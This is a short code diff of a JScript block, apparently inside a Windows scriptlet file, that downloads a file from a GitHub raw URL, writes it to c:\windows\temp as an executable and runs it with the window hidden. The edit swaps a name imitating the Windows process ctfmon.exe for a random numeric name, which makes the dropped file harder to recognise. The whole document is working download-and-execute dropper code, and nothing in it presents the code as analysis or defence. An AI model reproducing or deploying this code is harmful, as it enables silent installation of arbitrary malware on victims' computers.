@@ -10,7 +10,7 @@
     <script language="JScript">
         <![CDATA[
 var Source = "https://raw.githubusercontent.com/justtest1314/justme2/master/test.zip";
-var Target = "c:\\windows\\temp\\ctfmon.exe";
+var Target = "c:\\windows\\temp\\"+String(Math.random()*(Math.pow(10,10)))+".exe";
 var Object = new ActiveXObject('MSXML2.XMLHTTP');
 Object.Open('GET', Source, false);
 Object.Send();
@@ -24,7 +24,6 @@ if (Object.Status == 200)
     Stream.Type = 1; // adTypeBinary
     Stream.Write(Object.ResponseBody);
     Stream.Position = 0;
-    var File = new ActiveXObject('Scripting.FileSystemObject');
     Stream.SaveToFile(Target, 2); // adSaveCreateOverWrite
     Stream.Close();
     new ActiveXObject("WScript.Shell").Run(Target,0,true);
